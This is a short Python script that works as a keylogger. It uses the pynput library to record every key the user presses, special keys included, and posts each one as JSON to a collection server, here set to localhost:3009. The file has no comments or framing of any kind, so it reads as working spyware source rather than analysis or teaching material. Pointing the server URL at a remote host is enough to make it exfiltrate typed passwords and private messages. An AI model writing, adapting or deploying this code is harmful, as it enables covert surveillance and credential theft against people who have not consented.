from pynput import keyboard
import requests

SERVER_URL = "http://localhost:3009/"

def key_pressed(key):
    try:
        char = key.char
        send_key_to_server(char)  
    except AttributeError:
        send_key_to_server(f' [{key}] ')
    except Exception as e:
        print(f"Error: {e}")

def send_key_to_server(key_data):
    try:
        payload = {'key': key_data}
        response = requests.post(SERVER_URL, json=payload)
        if response.status_code == 201:
            print("Key sent successfully!")
        else:
            print(f"Failed to send key: {response.status_code}")
    except Exception as e:
        print(f"Error sending key: {e}")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()  
    listener.join()   
